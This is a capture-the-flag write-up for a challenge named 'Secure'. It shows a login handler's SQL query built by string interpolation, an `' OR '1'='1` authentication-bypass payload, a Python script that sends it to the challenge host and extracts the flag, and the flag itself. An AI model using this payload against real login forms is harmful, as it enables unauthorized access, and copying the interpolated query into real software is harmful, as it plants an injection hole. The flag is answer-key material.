# Secure

When submitting the form, the page sends a post request to `/login` with form values base64 encoded in the client. 

In the backend it inserts form values straight to the SQL query. This makes it vulnerable to SQL-injection. 

```javascript
const query = `SELECT id FROM users WHERE
          username = '${req.body.username}' AND
          password = '${req.body.password}';`;
  try {
    const id = db.prepare(query).get()?.id;

    if (id) return res.redirect(`/?message=${process.env.FLAG}`);
```

We can just send post request to the `/login` to bypass the base64 encoding.  

So login data should be: `username=YWRtaW4=` ("admin" in base64) and `password=' OR '1'='1`

Script to automate the process and print the flag. 
```python

import requests
from urllib.parse import unquote
import re
url = "https://secure.mc.ax/login"
headers = {"Content-Type": "application/x-www-form-urlencoded"}
data = {"username": "YWRtaW4=", "password": "' OR '1'='1"}
r = requests.post(url, headers=headers, data=data)
flag = re.findall("flag{.*}", unquote(r.url))[0]
print(flag)

```

### Flag
flag{50m37h1n6_50m37h1n6_cl13n7_n07_600d}